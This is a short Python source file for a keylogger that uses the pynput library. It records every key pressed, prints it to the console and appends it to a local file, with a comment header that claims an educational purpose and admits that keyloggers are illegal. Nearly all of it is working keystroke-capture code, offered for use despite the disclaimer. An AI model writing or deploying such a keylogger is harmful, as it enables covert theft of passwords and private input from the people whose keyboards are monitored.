# Keylogger using pynput
# This script logs keystrokes and saves them to a file called "keyloggerfile"
# It uses the pynput library to listen for keyboard events
# It prints the key pressed to the console and writes it to the file
# It handles both character keys and special keys (like Shift, Ctrl, etc.)
# This is a simple keylogger script
# It is intended for educational purposes only and should not be used for malicious purposes
# It is important to note that using keyloggers is illegal and unethical
# Make sure to install the pynput library using pip install pynput


from pynput import keyboard


def keyPressed(key):
    print(str(key))
    with open("keyloggerfile", "a") as logKey:
        try:
            char = key.char
            logKey.write(char)
            
        except AttributeError:
            logKey.write(f"\n[{str(key).split('.')[-1].upper()}]") 
        

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
    
    
    
    
    
    
    
    
    
    